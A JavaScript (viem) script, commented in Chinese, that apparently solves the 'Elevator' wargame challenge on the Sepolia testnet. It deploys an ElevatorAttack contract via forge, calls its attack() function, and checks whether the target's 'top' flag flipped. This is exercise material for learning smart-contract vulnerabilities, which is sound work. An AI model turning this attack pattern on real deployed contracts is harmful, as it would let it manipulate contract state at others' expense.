/**
 *  1.先部署ElevatorAttack合约,传入Elevator合约地址
 *   forge create src/12-Elevator/ElevatorAttack.sol:ElevatorAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $Elevator_ADDRESS
-> 0xAf05Ef3c618388C70904cb55E4d10e9706aBA14C=ElevatorAttack合约地址
    2.使用viem调用attack函数
 */

import { createWalletClient, http, createPublicClient } from 'viem'
import { sepolia } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'
import 'dotenv/config'

// 配置
const PRIVATE_KEY = process.env.PRIVATE_KEY
const SEPOLIA_RPC = process.env.sepolia_rpc
const ELEVATOR_ATTACK_ADDRESS = '0xAf05Ef3c618388C70904cb55E4d10e9706aBA14C'
const ELEVATOR_ADDRESS = process.env.Elevator_ADDRESS // 从环境变量获取

// 创建账户
const account = privateKeyToAccount(PRIVATE_KEY)

// 创建客户端
const publicClient = createPublicClient({
  chain: sepolia,
  transport: http(SEPOLIA_RPC)
})

const walletClient = createWalletClient({
  account,
  chain: sepolia,
  transport: http(SEPOLIA_RPC)
})

// ElevatorAttack 合约 ABI
const elevatorAttackAbi = [
  {
    inputs: [],
    name: "attack",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function"
  }
]

// Elevator 合约 ABI（用于检查结果）
const elevatorAbi = [
  {
    inputs: [],
    name: "top",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "floor",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function"
  }
]

async function main() {
  try {
    console.log('🚀 开始攻击 Elevator 合约...')
    
    // 检查攻击前的状态
    const topBefore = await publicClient.readContract({
      address: ELEVATOR_ADDRESS,
      abi: elevatorAbi,
      functionName: 'top'
    })
    
    console.log(`攻击前 top 状态: ${topBefore}`)
    
    // 调用 attack 函数
    const { request } = await publicClient.simulateContract({
      account,
      address: ELEVATOR_ATTACK_ADDRESS,
      abi: elevatorAttackAbi,
      functionName: 'attack'
    })
    
    const hash = await walletClient.writeContract(request)
    console.log(`交易已提交: ${hash}`)
    
    // 等待交易确认
    const receipt = await publicClient.waitForTransactionReceipt({ hash })
    console.log(`交易已确认，区块: ${receipt.blockNumber}`)
    
    // 检查攻击后的状态
    const topAfter = await publicClient.readContract({
      address: ELEVATOR_ADDRESS,
      abi: elevatorAbi,
      functionName: 'top'
    })
    
    const floorAfter = await publicClient.readContract({
      address: ELEVATOR_ADDRESS,
      abi: elevatorAbi,
      functionName: 'floor'
    })
    
    console.log(`攻击后 top 状态: ${topAfter}`)
    console.log(`攻击后 floor 状态: ${floorAfter}`)
    
    if (topAfter) {
      console.log('🎉 攻击成功！已到达顶层！')
    } else {
      console.log('❌ 攻击失败，未到达顶层')
    }
    
  } catch (error) {
    console.error('攻击失败:', error)
  }
}

main()